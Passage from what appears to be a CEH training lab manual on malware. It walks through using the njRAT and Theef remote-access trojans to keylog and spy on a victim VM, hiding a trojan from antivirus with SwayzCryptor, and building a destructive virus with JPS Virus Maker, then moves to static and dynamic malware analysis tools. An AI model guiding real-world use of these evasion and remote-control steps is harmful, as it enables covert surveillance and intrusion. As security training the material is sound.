Similarly, you can issue all other commands that can be executed in the command prompt of the victim machine.

In the same way, click Services. You will be able to view all services running on the victim machine. In this section, you can use options to start, pause, or stop a service.

Close the Manager window.

Right-click on the victim name, and then select Remote Desktop.

This launches a remote desktop connection without the victim’s awareness.

A Remote Desktop window appears; hover the mouse cursor to the top-center area of the window. A down arrow appears; click it.

It might take a while for the screen to appear.

Now, you will be able to remotely interact with the victim machine using the mouse.

If you want to create any files or write any scripts on the victim machine, you need to check the Keyboard option.

On completing the task, close the Remote Desktop window.

If a Hacked pop-up appears, click Continue to close it.

In the same way, right-click on the victim name, and select Remote Cam and Microphone to spy on them and track voice conversations.

Click Windows Server 2022 to switch to the Windows Server 2022 machine. Assume that you are a legitimate user and perform a few activities such as logging into any website or typing some text in text documents.

Click Windows 11 to switch back to the Windows 11 machine, right-click on the victim name, and click Keylogger.

The Keylogger window appears; wait for the window to load.

The window displays all the keystrokes performed by the victim on the Windows Server 2022 machine, as shown in the screenshot.

Close the Keylogger window.

Right-click on the victim name, and click Open Chat.

In real-time, as soon as the attacker sends the message, a pop-up appears on the victim’s screen (Windows Server 2022), as demonstrated in the screenshot.

Click Windows Server 2022 to switch to the Windows Server 2022 machine, you can observe the message from the hacker appears on the screen.

Seeing this, the victim becomes alert and attempts to close the chatbox. Irrespective of what the victim does, the chatbox remains for open as long as the attacker uses it.

Surprised by the behavior, the victim (you) attempts to break the connection by restarting the machine. As soon as this happens, njRAT loses its connection with Windows Server 2022, as the machine is shut down in the process of restarting.

However, as soon as the victim logs in to their machine, the njRAT client automatically establishes a connection with the victim, as shown in the screenshot.

Click Windows 11 to switch back to the attacker machine (Windows 11); you can see that the connection has been re-established with the victim machine.

It might take some time to establish a connection with the victim.

========
Task 2: Hide a Trojan using SwayzCryptor and Make it Undetectable to Various Anti-Virus Programs
========

Here, we will use the SwayzCryptor to hide a Trojan and make it undetectable by anti-virus software.

Click Windows 11 to switch to the Windows 11 machine, open any web browser (here, Google Chrome). In the address bar of the browser place your mouse cursor and type https://www.virustotal.com and press Enter.

The VirusTotal main analysis site appears; click Choose file to upload a virus file.

Screenshot

An Open dialog box appears; navigate to the location where you saved the malware file Test.exe in the previous task (Desktop), select it, and click Open.

Screenshot

Click Confirm upload on the VirusTotal page.

Screenshot

The VirusTotal uploads the file, scans it with the various anti-virus programs in its database. After the completion of the scan, the scan result appears, as shown in the screenshot.

Screenshot

You can see that 59 out of 69 anti-virus programs have detected Test.exe as a malicious file. Minimize the web browser window.

The detection ratio might vary when you perform this task.

Go to E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Crypters\SwayzCryptor and double-click SwayzCryptor.exe.

The SwayzCryptor GUI appears; click ellipses icon below File to select the Trojan file.

Screenshot

The Select a File dialog-box appears; navigate to the location of Test.exe (Desktop), select it, and click Open.

Screenshot

Once the file is selected, check the options Start up, Mutex, and Disable UAC, and then click Encrypt.

Screenshot

The Save File dialog-box appears; select the location where you want to store the crypted file (here, Desktop), leave the file name set to its default (CryptedFile), and click Save.

Screenshot

Once the encryption is finished, click Close.

Screenshot

Maximize the web browser (here, Google Chrome). In the VirusTotal analysis page, click the Upload file icon in the top-right corner of the page.

Screenshot

An Open dialog-box appears; navigate to the location where you saved the encrypted file CryptedFile.exe (Desktop), select the file, and click Open.

Screenshot

Click Confirm upload.

Screenshot

VirusTotal uploads the file and begins to scan it with the various anti-virus programs in its database. After the completion of the scan, the scan result appears, as shown in the screenshot.

Screenshot

Screenshot

Only a few anti-virus programs have detected CryptedFile.exe as a malicious file. Minimize or close the browser window.

Now, we will test the functioning of a Crypted file (CryptedFile.exe).

Go to E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Trojans Types\Remote Access Trojans (RAT)\njRAT, double-click the njRAT v0.7d.exe file and launch njRAT by choosing the default port number 5552, and then click Start.

In this exercise, we have already created a crypted file (CryptedFile.exe), built using njRAT.

Screenshot

Use any technique to send CryptedFile.exe to the intended target—through email or any other source (In real-time, attackers send this server to the victim).

In this task, we copied the CryptedFile.exe file to the shared network location (CEH-Tools) to share the file.

Screenshot

Click Windows Server 2022 to switch to the Windows Server 2022 machine.

If you are logged out of the Windows Server 2022 machine, click Ctrl+Alt+Delete, then login into CEH\Administrator user profile using Pa$$w0rd as password.

Navigate to the shared network location (CEH-Tools), and then Copy and Paste the executable file (CryptedFile.exe), in which the attacker (here, you) sent the server executable, to the Desktop of Windows Server 2022.

Here, you are acting both as the attacker who logs into the Windows 11 machine to create a malicious server and as the victim who logs into the Windows Server 2022 machine and downloads the server.

Double-click CryptedFile.exe to run this malicious executable.

If You must restart your computer to turn off User Account Control pop-up appears in the right-bottom corner of the window, then Restart the Windows Server 2022 machine and click Ctrl+Alt+Delete to activate the machine, by default, CEH\Administrator account is selected, click Pa$$w0rd to enter the password and press Enter.

Screenshot

As soon as the victim (here, you) double-clicks the server, the executable starts running, and the njRAT client (njRAT GUI) running on the Windows 11 machine establishes a persistent connection with the victim machine.

Click Windows 11 to switch to the Windows 11 machine and in the njRAT window you can observe that the connection has been established with the victim machine.

Screenshot

Unless the attacker working on the Windows 11 machine disconnects the server on their own, the victim machine remains under their control.

Thus, you have created an undetectable Trojan that can bypass the anti-virus and firewall programs, as well as be used to maintain a persistent connection with the victim.

On completion of this lab, click Windows Server 2022 to switch to the Windows Server 2022 machine, launch Task Manager, click on More details and look for the server.exe (32 bit) process, and click End task on the Windows Server 2022 machine.

This concludes the demonstration of how to hide a Trojan using SwayzCryptor to make it undetectable to various anti-virus programs.

========
Task 3: Create a Trojan Server using Theef RAT Trojan
========

Theef is a Remote Access Trojan written in Delphi. It allows remote attackers access to the system via port 9871. Theef is a Windows-based application for both client and server. The Theef server is a virus that you install on a target computer, and the Theef client is what you then use to control the virus.

Generally, an attacker might send a server executable to the victim machine and entice the victim into running it. In this lab, for demonstration purposes, we are directly executing the file on the victim machine, Windows Server 2022.

Click Windows Server 2022 to switch to the Windows Server 2022 machine. Click Ctrl+Alt+Delete to activate the machine, by default, CEH\Administrator account is selected, click Pa$$w0rd to enter the password and press Enter.

Networks screen appears, click Yes to allow your PC to be discoverable by other PCs and devices on the network.

Screenshot

Navigate to Z:\CEHv12 Module 07 Malware Threats\Trojans Types\Remote Access Trojans (RAT)\Theef and double-click Server210.exe to run the Trojan on the victim machine.

If an Open File - Security Warning pop-up appears, click Run.

Screenshot

Now, click Windows 11 to switch to the Windows 11 machine (as an attacker).

Navigate to E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Trojans Types\Remote Access Trojans (RAT)\Theef and double-click Client210.exe to access the victim machine remotely.

Screenshot

The Theef main window appears, as shown in the screenshot.

Screenshot

Enter the IP address of the target machine (here, Windows Server 2022) in the IP field (10.10.1.22), and leave the Port and FTP fields set to default; click Connect.

Screenshot

Now, from Windows 11, you have successfully established a remote connection with the Windows Server 2022 machine.

To view the computer’s information, click the Computer Information icon ( 2022-04-05_10-18-17.jpg) from the lower part of the window.

Screenshot

In Computer Information, you can view PC Details, OS Info, Home, and Network by clicking their respective buttons.

Here, for example, selecting PC Details reveals computer-related information.

Screenshot

Click the Spy icon ( 2022-04-05_10-18-27.jpg) to perform various operations on the target machine.

Screenshot

You can perform various operations such as capture screens, log keys, view processes, view the task manager, use the webcam, and use the microphone on the victim machine by selecting their respective options.

Here, for instance, selecting Task Manager views the tasks running on the target machine.

Screenshot

In the Task Manager window, click Refresh icon to obtain the list of running processes.

Screenshot

Select a process (task); click the Close window icon ( 2022-04-05_10-22-17.jpg) to end the task on the target machine.

Screenshot

Close the Task Manager window.

The tasks running in the task manager might vary when you perform this task.

From the Spy menu, click Keylogger to record the keystrokes made on the victim machine.

Screenshot

The Keylogger pop-up appears; click the Start icon ( 2022-04-05_10-27-27.jpg) to read the keystrokes of the victim machine.

Screenshot

Click Windows Server 2022 to switch to the Windows Server 2022 machine.

If you are logged out of the Windows Server 2022 machine, click Ctrl+Alt+Delete, then login into CEH\Administrator user profile using Pa$$w0rd as password.

Open a browser window and browse some websites or open a text document and type some sensitive information.

Here, we are creating a notepad file (Test.txt), however you can perform some other activity.

Screenshot

Click Windows 11 to switch back to the attacker machine (Windows 11) to view the recorded keystrokes of the victim machine in the Theef Keylogger window.

Screenshot

Close the Theef Keylogger window.

Similarly, you can access the details of the victim machine by clicking on the various icons.

########
Lab 2
########

========
Task 1: Create a Virus using the JPS Virus Maker Tool and Infect the Target System
========

The JPS Virus Maker tool is used to create its own customized virus. This tool has many options for building that can be used to create a virus. Some of the tool’s features are auto-start, shutdown, disable security center, lock mouse and keyboard, destroy protected storage, and terminate windows. An ethical hacker and pen-tester can use the JPS Virus Maker Tool as a proof of concept to audit perimeter security controls in an organization.

After performing this task, we will end and re-launch the lab instance, as Windows Server 2019 machine will be infected by the virus.

In the Windows 11 machine, navigate to E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Virus Maker\JPS Virus Maker and double-click jps.exe.

If an Open File - Security Warning pop-up appears, click Run.

The JPS (Virus Maker 4.0) window appears; tick the Auto Startup checkbox.

2022-04-05_14-21-41.jpg

The window displays various features and options that can be chosen while creating a virus file.

From the Virus Options, check the options that you want to embed in a new virus file.

In this task, the options embedded in the virus file are Disable TaskManager, Disable Windows Update, Disable Control Panel, Disable Drives, Hide Windows Clock, Hide Desktop Icons, Enable Remote Desktop, Remove Bluetooth, Turn Off Windows Firewall, Turn Off Windows Defender, and Auto Startup.

Screenshot

Ensure that the None radio button is selected to specify the trigger event when the virus should start attacking the system after its creation.

Now, before clicking on Create Virus!, click the right arrow icon from the right-hand pane of the window to configure the virus options.

2022-04-05_14-24-00.jpg

A Virus Options window appears, as shown in the screenshot.

Check the Change Windows Password option, and enter a password (here, qwerty) in the text field. Check the Change Computer Name option, and type Test in the text field.

You can even configure the virus to convert to a worm. To do this, check the Enable Convert to Worm checkbox, and provide a Worm Name (here, fedevi). For the worm to self-replicate after a particular time, specify the time in seconds (here, 1 second) in the Copy After field.

Ensure that the JPG Icon radio button is selected under the Change Icon section. Ensure that the None radio button is selected in the lower part of the window.

After completing your selection of options, click the drop-down icon next to the Create Virus! button and select x86(32Bit); click Create Virus!

2022-04-05_14-26-32.jpg

A Virus Created Successful! pop-up appears; click OK.

Screenshot

The newly created virus (server) is placed automatically in the folder where jps.exe is located, but with the name Server.exe. Navigate to E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Virus Maker\JPS Virus Maker and observe that the newly created virus with the name Server.exe is available at the specified location.

Screenshot

Now, pack this virus with a binder or virus packager and send it to the victim machine through email, chat, a mapped network drive, or other method.

In this task, we are using a mapped network drive to share the virus file to the victim machine. Assume that you are a victim and that you have received this file.

Click Windows Server 2019 to switch to the Windows Server 2019 machine. Click Ctrl+Alt+Delete to activate the machine, by default, Administrator account is selected, click Pa$$w0rd to enter the password and press Enter.

Here, we are logging into the machine as a victim.

Screenshot

Navigate to Z:\CEHv12 Module 07 Malware Threats\Virus Maker\JPS Virus Maker and double-click Server.exe file to execute the virus.

Screenshot

Once you have executed the virus, close the window and you can observe that the Desktop screen goes blank, indicating that the virus has infected the system, as shown in the screenshot.

Screenshot

Surprised by the system behavior, the victim (you) attempts to fix the machine by restarting it. Once the machine has rebooted, try to log in to the machine with the provided Username and Password. You should receive the error message “the password is incorrect. Try again.”

Click Ctrl+Alt+Delete to activate the machine, by default, Administrator account is selected, click Pa$$w0rd to enter the password and press Enter.

Screenshot

Click OK and login with the password that you provided at the time of virus creation (i.e., qwerty). You should log in to the machine with the new password.

qap2xqnv1.jpg

Now, try to open Task Manager; observe that an opening error pop-up appears, and then click OK.

Screenshot

You will get a similar error for all the applications that are disabled by the virus.

This is how attackers infect a system with viruses. Now, before going to the next task, End the lab and re-launch it to reset the machines. To do so, click the Menu icon ( 2022-04-05_14-35-41.jpg) and click END from the drop-down options.

########
Lab 3: Static Malware Analysis
########

========
Task 1: Perform Malware Scanning using Hybrid Analysis
========

Hybrid Analysis is a free service that analyzes suspicious files and URLs and facilitates the quick detection of unknown threats such as viruses, worms, Trojans, and other kinds of malware.

It helps ethical hackers and penetration testers to examine files and URLs, enabling the identification of viruses, worms, Trojans, and other malicious content detected by anti-virus engines and website scanners.

This task will demonstrate how to analyze malware using online Hybrid Analysis services.

By default, Windows 11 machine selected, click Ctrl+Alt+Delete.

Alternatively, you can also click Ctrl+Alt+Delete button under Windows 11 machine thumbnail in the Resources pane or Click Ctrl+Alt+Delete button under Commands (thunder icon) menu.

By default, Admin user profile is selected, click Pa$$w0rd to paste the password in the Password field and press Enter to login.

Alternatively, you can also click Pa$$w0rd under Windows 11 machine thumbnail in the Resources pane or Click Type Text | Type Password button under Commands (thunder icon) menu.

Networks screen appears, click Yes to allow your PC to be discoverable by other PCs and devices on the network.

Screenshot

Open any web browser (here, Google Chrome). In the address bar of the browser place your mouse cursor, type https://www.hybrid-analysis.com and press Enter.

If a cookie notification appears in the lower section of the page, then click ACCEPT.

The HYBRID ANALYSIS main page appears; click Drag & Drop For Instant Analysis section to upload a virus file.

Screenshot

The Open window appears; navigate to E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Viruses, select tini.exe, and click Open.

Screenshot

Getting Things Ready page appears and the virus file begins to upload. Once it is uploaded, the status bar reaches 100%, as shown in the screenshot.

Screenshot

Now, enter your personal mail in Your E-mail field and enter a comment in Your Comment field. Scroll-down to check the I consent to the Terms & Conditions and Data Protection Policy checkbox and I'm not a robot checkbox. Click Continue.

2022-04-07_10-50-42.jpg

Analysis Environments page appears, select Windows 7 64 bit radio-button and click Generate Public Report.

Screenshot

The report generation process initializes and after it completes, Analysis Overview page appears.

If you receive an error in the webpage, then reload the page to obtain the result.

You can observe that the file is detected as malicious with threat score at 100 along with the additional information such as SHA value.

Screenshot

In the Anti-Virus Results section, you can observe the AV results obtained from different online resources such as CrowdStrike Falcon, MetaDefender and VirusTotal.

To further view the complete information obtained by the online resources you can click a link given in the Visit Vendor section. Here, we will view the AV results obtained by the VirusTotal. Click the hyperlink icon ( 2022-04-07_11-06-17.jpg) to open the result in the new tab.

Screenshot

Navigate to the new tab and you can observe that the VirusTotal returns a detailed report displaying the result of each anti-virus for the selected tini.exe malicious file under the DETECTION tab, as shown in the screenshot.

Screenshot

Now, click the DETAILS tab to view the malicious file details such as Basic Properties, History, Names, Portable Executable Info, Sections, Imports, and ExifTool File Metadata.

Screenshot

Click the RELATIONS tab to view Execution Parents, PE Resource Parents, Contained in Graphs, and Graph Summary. Scroll down to view other details.

Screenshot

Click the BEHAVIOR tab to view the File System Actions, Process and Service Actions, Shell Commands, and Synchronization Mechanisms & Signals.

Screenshot

Now, close the VirusTotal tab to switch back to the previous tab.

You can further scroll-down in the results page to view information related to Hashes, Falcon reports and Incident Response.

Screenshot

Screenshot

This concludes the demonstration of malware scanning using Hybrid Analysis.

Close all open windows.

You can also use other local and online malware scanning tools such as Valkyrie (https://valkyrie.comodo.com), Cuckoo Sandbox (https://cuckoosandbox.org), Jotti (https://virusscan.jotti.org) or IObit Cloud (https://cloud.iobit.com) to perform online malware scanning.

========
Task 2: Perform a Strings Search using BinText
========

Here, we will use the BinText tool to extract embedded strings from executable files.

On the Windows 11 machine, navigate to E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Static Malware Analysis Tools\String Searching Tools\BinText and double-click bintext.exe.

The BinText main window appears; click Browse to provide a file to scan. Here, we need to provide a malicious file to analyze the text.

Make sure that the Advanced view option is checked.

Screenshot

The Open file for Scanning window appears, navigate to E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Viruses\Klez Virus Live! and select face.exe, the malicious file, and click Open to extract the text from the malicious file.

Screenshot

As soon as the file is provided for scan, click Go. BinText will start extracting the text from the designated malicious file.

Screenshot

BinText extracts the provided malicious file’s critical information, as shown in the screenshot.

Screenshot

Screenshot

The type of string is designated by a colored letter to the left of the list. ANSI strings are marked with a green “A,” Unicode strings (double byte ANSI) have a red “U,” and resource strings have a blue “R.”

“File pos” is the HEX position at which the text is located in the file.

“Mem pos” if the file is a Win32 PE file (such as Win95 EXEs and DLLs), then this is the HEX address at which the text is referred to in the memory at runtime, as determined by its sections table.

“ID” is the decimal string resource ID or 0 if it is not a resource string.

Close all windows once the analysis is complete.

You can also use other string searching tools such as FLOSS (https://www.fireeye.com), Strings (https://docs.microsoft.com), Free EXE DLL Resource Extract (https://www.resourceextract.com), or FileSeek (https://www.fileseek.ca) to perform string search.

========
Task 3: Identify Packaging and Obfuscation Methods using PEid
========

Here, we will use the PEid tool to detect common packers, cryptors, and compilers for PE executable files.

In the Windows 11 machine, navigate to E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Static Malware Analysis Tools\Packaging and Obfuscation Tools\PEid and double-click PEiD.exe.

The PEiD main window appears. Click the Browse button to upload a malicious file for analysis.

Screenshot

The Choose the file to open window appears; navigate to E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Viruses\Klez Virus Live!, select the face.exe file, and click Open.

Screenshot

As soon as you click Open, PEiD analyzes the file and provides information, as shown in the screenshot.

Screenshot

Close all windows once the analysis is complete.

========
Task 4: Analyze ELF Executable File using Detect It Easy (DIE)
========

Detect It Easy (DIE) is an application used for determining the types of files. Apart from the Windows, DIE is also available for Linux and Mac OS. It has a completely open architecture of signatures and can easily add its own algorithms for detecting or modifying the existing signatures. It detects a file’s compiler, linker, packer, etc. using a signature-based detection method.

In the Windows 11 machine, navigate to E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Static Malware Analysis Tools\Packaging and Obfuscation Tools\DIE and double-click die.exe.

Screenshot

Open File - Security Warning appears, click Run.

Detect It Easy window appears. Click ellipses icon next to the File name text field.

2022-04-07_19-49-37.jpg

The Open file… window appears; navigate to E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Viruses, select ELF Test File, and click Open.

Screenshot

Detect It Easy automatically scans the file and result appears showing the Operating system, compiler and language details in the middle pane, as shown in the screenshot.

Screenshot

Click File info button from the top right corner of the window. Info window appears, you can observe information such as File name, size, MD5, SHA1, Entropy, entry points, etc.

2022-04-07_19-56-57.jpg

After viewing the information, click Close to close it.

Similarly, click Hash button from the top right corner of the window to view the information related to hash. Click Close to close the window.

Screenshot

Click Entropy button from the top right corner of the window. Here, you can observe the status, size and graph of entropy. Click Close to close the window.

Screenshot

Similarly, you can further explore other functions such as MIME, Hex, Signatures and Demangle.

This concludes the demonstration of ELF file analysing using Detect It Easy (DIE).

Close all the open windows.

You can also use other packaging/obfuscation tools such as Macro_Pack (https://github.com), UPX (https://upx.github.io), or ASPack (http://www.aspack.com) to identify packing/obfuscation methods.

========
Task 5: Find the Portable Executable (PE) Information of a Malware Executable File using PE Explorer
========

Here, we will use the PE Explorer tool to view the PE information of a malware executable file.

On the Windows 11 machine, navigate to E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Static Malware Analysis Tools\PE Extraction Tools\PE Explorer and double-click PE.Explorer_setup.exe.

If a User Account Control pop-up appears, click Yes.

Follow the wizard-driven installation steps to install PE Explorer.

In the last step of the installation, make sure that the Launch PE Explorer option is checked to launch the application automatically; uncheck the View PE Explorer User’s Guide option and click Finish.

Screenshot

The PE Explorer main window appears. Navigate to File and click Open File from the menu to start exploring executable files. You can drag and drop the file into the PE Explorer window.

Screenshot

An open window appears; navigate to E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Viruses\Klez Virus Live!. Select the face.exe file and click Open.

Screenshot

The PE Explorer evaluation pop-up appears; click Continue.

Screenshot

PE Explorer provides you with an analysis of the file, as shown in the screenshot.

The HEADERS INFO section provides you with the ability to:

View and save a text report on the file headers information
Modify the entry point value
Updates the value of the checksum in the header
Set flag bits in the file header characteristics field
Screenshot

Click the Data Directories icon ( 2022-04-05_17-58-57.jpg)) from the menu bar. This will provide you with the DATA DIRECTORIES information such as the ability to view and edit the virtual address and size of the chosen directory describing provisions of parts of the code.

Screenshot

The trailing array of Data Directories cover pointers to the data in the sections.

Screenshot

Click Section Headers icon ( 2022-04-05_18-00-40.jpg) from the menu bar. This will provide you with the SECTION HEADERS information, allowing you to view all sections and information about their location and size.

Screenshot

Double click on any section to view the raw content. This will open a mini hex viewer window.

Close the hex viewer window after analysis.

Screenshot

This is how to analyze a malicious file using PE Explorer. Close all open windows.

You can also use other PE extraction tools such as Portable Executable Scanner (pescan) (https://tzworks.net), Resource Hacker (http://www.angusj.com), or PEView (https://www.aldeid.com) to find the Portable Executable (PE) information of a malware executable file.

========
Task 6: Identify File Dependencies using Dependency Walker
========

Here, we will use the Dependency Walker tool to identify the file dependencies of an executable file.

On the Windows 11 machine, navigate to E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Static Malware Analysis Tools\File Dependency Checking Tools\Dependency Walker, and double-click depends.exe.

Screenshot

The Dependency Walker main window appears; navigate to File and click Open to import the malicious file.

Screenshot

The open window appears; navigate to E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Viruses\Klez Virus Live!. Select the snoopy.exe file and click Open.

Screenshot

The Dependency Walker pop-up appears, along with the error detected while processing the file; click OK.

Screenshot

The SNOOPY.EXE file is imported to the Dependency Walker, as shown in the screenshot.

Shrink the .DLL nodes to view all available DLLs for the malicious file.

Screenshot

The available DLLs for snoopy.exe are listed in the left-pane of the window, as shown in the screenshot.

Screenshot

Click on any DLL dependency to view the details of the DLL file. In this task, we are choosing KERNEL32.DLL.

As soon as you select the DLL, the Dependency Walker displays the DLL details in the Import Section and Export Section, as shown in the screenshot.

2022-04-05_18-16-52.jpg

Analyze all DLL dependencies of the imported malicious file. Close all open windows once the analysis is complete.

You can also use other dependency checking tools such as Dependency-check (https://jeremylong.github.io), Snyk (https://snyk.io), or RetireJS (https://retirejs.github.io) to identify file dependencies.

========
Task 7: Perform Malware Disassembly using IDA and OllyDbg
========

IDA As a disassembler, IDA explores binary programs, for which the source code might not be available, to create maps of their execution. The primary purpose of a disassembler is to display the instructions actually executed by the processor in a symbolic representation called “assembly language.” However, in real life, things are not always simple. Hostile code usually does not cooperate with the analyst. Viruses, worms, and Trojans are often armored and obfuscated; as such, more powerful tools are required. The debugger in IDA complements the static analysis capabilities of the disassembler. By allowing an analyst to single-step through the code being investigated, the debugger often bypasses the obfuscation. It helps obtain data that the more powerful static disassembler will be able to process in depth.

In the Windows 11 machine, click Search icon ( 2022-04-06_09-57-11.jpg) on the Desktop. Type ida in the search field, the IDA Freeware appears in the result, click Open to launch it.

Screenshot

If the IDA License window appears, click on I Agree.

Screenshot

User interface telemetry window appears, uncheck Yes, I want to help improve IDA checkbox and click OK.

Screenshot

The IDA: Quick start pop-up appears; click on New to select a malicious file for disassembly.

Screenshot

The IDA main window appears, along with the Select file to disassemble window.

In the Select file to disassemble window, navigate to E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Viruses\Klez Virus Live!, select face.exe, and click Open.

Screenshot

The Load a new file window appears; by default, the Portable executable for 80386 (PE) [pe64.dll] option selected; click OK.

Screenshot

If a Warning pop-up appears, click OK.

If a Please confirm dialog-box appears, read the instructions carefully, and then click Yes.

IDA completes the analysis of the imported malicious file and displays the results in the IDA View-A tab, as shown in the screenshot.

12121eeee.jpg

In the IDA View-A section, right-click anywhere and choose Text view from the context menu to view the text information of the malicious file uploaded to IDA for analysis.

Screenshot

This reveals the text view of the malicious file, allowing analysis of its information.

Screenshot

Now, minimize the IDA window, and navigate to E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Static Malware Analysis Tools\Disassembling and Debugging Tools\IDA. Copy the qwingraph.exe file and paste it in IDA’s installation location. In this task, the location is C:\Program Files\IDA Freeware 7.7.

If a Destination Folder Access Denied notification appears, click Continue.

Screenshot

Maximize the IDA window. To view the flow of the uploaded malicious file, navigate to View --> Graphs and click Flow chart.

Screenshot

A Graph window appears with the flow. You may zoom in and adjust the screen to view this more clearly.

Screenshot

Screenshot

Close the Graph window, go to View --> Graphs, and click Function calls from the menu bar.

Screenshot

A window showing call flow appears; zoom in for a better view. Close the WinGraph32 Call flow window after completing the analysis.

Screenshot

Screenshot

Click the HexView-1 tab to view the hex value of the malicious file.

2022-04-06_10-21-00.jpg

Click the Structures tab to view the structure of the file, as shown in the screenshot.

2022-04-06_10-22-49.jpg

Click the Enums tab to view the Windows Enum results, as shown in the screenshot

Screenshot

Close all open windows. In the Save database pop-up, click OK.

========
Task 8: Perform Malware Disassembly using Ghidra
========

Here, we will use Ghidra to perform malware disassembly.

In the Windows 11 machine, navigate to E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Static Malware Analysis Tools\Disassembling and Debugging Tools\Ghidra and double-click ghidraRun.bat.

Screenshot

After Ghidra initializes, a Tip of the Day pop-up appears, click Close to close it.

Ghidra: NO ACTIVE PROJECT window appears, click File and select New Project….

Screenshot

New Project window appears, leave the default selected option to Non-Shared Project and click Next.

Screenshot

In the next window, enter the Project Name as Malware Analysis and click Finish.

Screenshot

A new project with the name as Malware Analysis has been created, as shown in the screenshot.

Screenshot

Now, navigate to File --> Import File….

Screenshot

Select File to Import window appears, navigate to E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Viruses\Klez Virus Live!, select face.exe, and click Select File to Import.

Screenshot

Import window appears, click OK.

After the completion of file import, Import Results Summary window appears, click OK.

Screenshot

You can observe that Face.exe is added as a children node under the Malware Analysis project. Double-click Face.exe node.

Screenshot

Analyze pop-up appears, click Yes.

Screenshot

Analyze Options window appears, leave the default options and click Analyze.

Screenshot

This initiates the analysis process, you can monitor the status bar present at the lower right section of the window. Wait for it to complete.

After the analysis, assembly code of face.exe file appears along with the decompiler, as shown in the screenshot.

Screenshot

In the left pane, under Symbol Tree, you can observe various components of face.exe file such as Imports, Exports, Functions and Labels.

Screenshot

Click to expand Imports node and you can view the DLL files of face.exe.

Screenshot

Similarly, you can view other components under Symbol Tree to obtain additional information on face.exe.

Close the Decompiler tab.

Now, In the left-pane, under Program Tree, double-click Headers node to jump to the header function in the code snippet.

2022-04-07_17-03-18.jpg

Similarly, double-click .rdata node to view the rdata function in the code snippet.

Screenshot

You can further explore various other functionalities in the Ghidra tool to analyze the face.exe file.

This concludes the demonstration of malware disassembly using Ghidra.

Close all the open windows.

You can also use other disassembling and debugging tools such as Radare2 (https://rada.re), WinDbg (http://www.windbg.org), and ProcDump (https://docs.microsoft.com) to perform malware disassembly.

########
Lab 4: Perform Dynamic Malware Analysis
########

========
Task 1: Perform Port Monitoring using TCPView and CurrPorts
========

In the Windows 11 machine, navigate to E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Trojans Types\Remote Access Trojans (RAT)\njRAT and double-click njRAT v0.7d.exe to launch njRAT. Click Start.

Screenshot

The njRAT GUI appears; click the Builder link located in the lower-left corner of the GUI to configure the exploit details.

2022-04-06_11-42-33.jpg

The Builder dialog-box appears; enter the IP address of the Windows 11 (attacker machine) machine in the Host field, check the option Registy StarUp, rename ExeName as Trojan.exe. Leave the other settings to default, and click Build.

In this task, the IP address of the Windows 11 machine is 10.10.1.11.

2022-04-06_11-44-45.jpg

Save As window appears, E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Trojans Types\Remote Access Trojans (RAT)\njRAT. In the File name, enter Trojan.exe and click Save. Done! pop-up appears, click OK.

Screenshot

Minimize njRAT window. You can observe that a Trojan.exe file has been created at the location E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Trojans Types\Remote Access Trojans (RAT)\njRAT.

Screenshot

Click Windows Server 2022 to switch to the Windows Server 2022 machine. Click Ctrl+Alt+Delete to activate the machine, by default, CEH\Administrator account is selected, click Pa$$w0rd to enter the password and press Enter.

Networks screen appears, click Yes to allow your PC to be discoverable by other PCs and devices on the network.

Screenshot

Navigate to Z:\CEHv12 Module 07 Malware Threats\Trojans Types\Remote Access Trojans (RAT)\njRAT and double-click Trojan.exe.

Screenshot

Observe that a connection has been established by the njRAT client. Click Windows 11 to switch to the Windows 11 machine. Switch to njRAT window to observe the established connection.

Screenshot

Now, let us analyze this process on Windows Server 2022 using TCPView tool. Click Windows Server 2022 to switch back to the Windows Server 2022 machine.

Navigate to Z:\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Dynamic Malware Analysis Tools\Port Monitoring Tools\TCPView and double-click Tcpview.exe to launch the application.

If a User Account Control pop-up appears, click Yes.

Screenshot

If a TCPView License Agreement window appears, click the Agree button to agree to the terms and conditions.

The TCPView main window appears, displaying the details such as Process, ProcessId, Protocol, Local Address, Local Port, Remote Address, Remote Port, and State, as shown in the screenshot.

Screenshot

TCPView performs Port monitoring. Click the Local Port tab to view the ports in serial order.

Screenshot

Observe the protocols running on different ports under the Protocol column.

Screenshot

As you have executed a malicious application, now search for the Trojan.exe process in the TCPView.

You can observe that the Trojan.exe malicious program is running on the Windows Server 2022 machine. You can see details such as Remote Address and Remote Port.

Screenshot

Right-click the process Trojan.exe; select Kill Process… to end the running process.

Screenshot

Normally, if a TCPView dialog box appears, click OK to terminate the process. However, for this task, do not Kill the process in this step as we are going to use this running process for the next task; click Cancel.

Screenshot

This way, you can view all processes running on the machine and stop unwanted or malicious processes that may affect your system. If you are unable to stop a process, you can view the port on which it is running and add a firewall rule to block the port.

Close the TCPView window.

Now, let us analyze this process on Windows Server 2022 using CurrPorts.

Navigate to Z:\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Dynamic Malware Analysis Tools\Port Monitoring Tools\CurrPorts and double-click cports.exe.

Screenshot

The CurrPorts window appears, displaying a list of currently open TCP/IP and UDP ports on the machine.

Screenshot

Scroll-down to search for Trojan.exe process running on the machine, as the shown in the screenshot. It is evident from the above screenshot that the process is connected to the machine on port 5552.

Screenshot

You can view the properties of the process by right-clicking on the process and clicking Properties from the Context menu.

Screenshot

